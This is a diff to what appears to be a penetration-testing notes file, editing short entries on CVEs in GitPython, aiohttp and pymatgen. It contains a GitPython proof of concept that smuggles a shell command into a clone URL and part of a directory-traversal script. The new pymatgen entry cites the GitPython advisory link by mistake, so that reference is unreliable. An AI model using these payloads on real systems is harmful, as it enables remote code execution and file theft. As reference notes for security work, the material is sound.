@@ -266,9 +266,9 @@ netstat -tuln
 
 # CVEs
 
-## CVE-2022-24439 - GitPython [RCE]
+## CVE-2022-24439: python-gitpython [RCE]
 - Affecting gitpython package, versions<3.1.30
-- PoC
+- PoC exists
 ```python
 from git import Repo
 r = Repo.init('', bare=True)
@@ -276,9 +276,9 @@ r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.
 ```
 > https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
 
-## CVE-2024-23334 - python-aiohttp [Directory Traversal]
+## CVE-2024-23334: python-aiohttp [Directory Traversal]
 - Affecting python-aiohttp package, versions<3.9.5-1
-- PoC
+- PoC exists
 ```bash
 #!/bin/bash
 url="http://localhost:8080"
@@ -298,3 +298,9 @@ done
 ```
 > https://security.snyk.io/vuln/SNYK-DEBIAN13-PYTHONAIOHTTP-6210121
 > https://github.com/z3rObyte/CVE-2024-23334-PoC
+
+## CVE-2024-23346: python-pymatgen [Command Injection]
+- Affecting pymatgen package, versions<2024.2.20
+- PoC exists
+> https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+> https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0
